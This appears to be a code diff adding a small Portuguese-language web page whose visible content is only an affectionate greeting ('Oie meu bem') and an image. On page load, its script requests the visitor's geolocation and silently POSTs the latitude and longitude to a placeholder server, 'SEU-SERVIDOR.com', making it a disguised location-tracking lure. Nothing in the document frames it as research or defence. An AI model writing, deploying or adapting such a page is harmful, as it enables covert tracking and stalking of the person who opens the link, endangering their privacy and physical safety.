@@ -1,0 +1,30 @@
+// Frontend (index.html)
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Localização</title>
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    fetch('https://SEU-SERVIDOR.com/location', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        })
+                    });
+                });
+            }
+        }
+        window.onload = sendLocation;
+    </script>
+</head>
+<body>
+    <h1>Oie meu bem </h1>
+    <img src="4eebb86e6ed7b38666606778cc52c480.jpg"
+</body>
+</html>
